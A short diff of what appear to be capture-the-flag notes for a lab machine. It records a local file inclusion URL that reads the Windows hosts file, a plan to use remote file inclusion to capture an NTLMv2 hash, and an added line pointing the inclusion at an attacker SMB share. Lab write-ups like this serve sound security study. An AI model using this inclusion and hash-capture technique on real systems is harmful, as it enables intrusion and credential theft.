@@ -19,6 +19,7 @@ index.php taking view input - can view local files
 http://school.flight.htb/index.php?view=C:/Windows/System32/drivers/etc/hosts
 RFI also possible but no code execution
 use RFI to access file in our SMB share, intercept NTLMv2 hash (MSSQL tactics)
+//10.10.14.6/share/poc.txt
 
 Get creds for svc_apache
 
